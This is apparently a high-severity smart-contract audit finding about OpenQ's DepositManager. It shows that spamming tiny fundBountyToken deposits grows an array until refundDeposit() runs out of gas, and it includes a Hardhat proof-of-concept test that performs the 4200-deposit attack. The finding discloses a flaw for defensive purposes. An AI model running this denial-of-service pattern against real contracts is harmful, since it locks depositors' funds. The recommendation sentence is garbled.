# [H] - RefundDeposit will fail in the future due to Out of Gas error.

## Summary

refundDeposit() in the DepositManagerV1.sol calls a view function - bounty.getLockedFunds(depToken) which iterates over each deposits array. The deposit array increases in length whenever the receiveFunds is called. So, as it increases the gas used to call the refundDeposit() also increases. This can eventually run out of gas when it deposits array reach about 4200 in length.

## Vulnerability Detail

The code where the deposits array is iterated is on **Line 333 of BountyCore.sol - in the getLockedFunds function.**

An attacker can easily attack this by calling `fundBountyToken()` multiple times(about 4200 times) with very low amount of tokens. Since the chain used here is polygon, the cost of attack is low.

Once the `deposits` array is too large, the function `refundDeposit()` will no longer work and when the real user tries to withdraw, the funds wonâ€™t be sent as the function reverts.

The below code was used to run the tests and eventually make the function run out of gas.

## Impact

It has an impact on the entire contract

## Code Snippet



```solidity

describe('gas error', () => {
		it("Should run out of gaaaaassss", async () => {
			await openQProxy.mintBounty(Constants.bountyId, Constants.organization, atomicBountyInitOperation);
			const bountyAddress = await openQProxy.bountyIdToAddress(Constants.bountyId);

			// Assume attacker has some very small amount of link tokens. Transfering some from owner
			await mockLink.connect(owner).transfer(attacker.address,5000)


			let linkDepositId;
			// User deposits
			await mockLink.connect(owner).approve(bountyAddress, ethers.utils.parseEther("9499"));
			linkDepositId = generateDepositId(Constants.bountyId, 0);
			await depositManager.connect(owner).fundBountyToken(bountyAddress, mockLink.address, ethers.utils.parseEther("9499"), 1, Constants.funderUuid);

			const balanceAfterFunded = await mockLink.balanceOf(owner.address);

			// Attacker approves and deposits very small amounts in loops
			// Since the chain used is Polygon, the cost of attack is low
			await mockLink.connect(attacker).approve(bountyAddress, 5000);
			const volume = 1;
			for(let i=1; i<4200; i++){
				await depositManager.connect(attacker).fundBountyToken(bountyAddress, mockLink.address, volume, 1, Constants.funderUuid);
			}

			const thirtyTwoDays = 2765000;
			ethers.provider.send("evm_increaseTime", [thirtyTwoDays]);

			await expect(depositManager.connect(owner).refundDeposit(bountyAddress, linkDepositId)).to.be.reverted;

			const balanceAfterRefund = await mockLink.balanceOf(owner.address);
			expect(balanceAfterFunded).to.eq(balanceAfterRefund);

		})
	 })

```

So as seen above, when about 4200 deposits where made and after that when the refundDeposit() was called, it gave an out of gas error.

## Recommendation

To have some upper bound on gas consumption with that another for loop is tracking
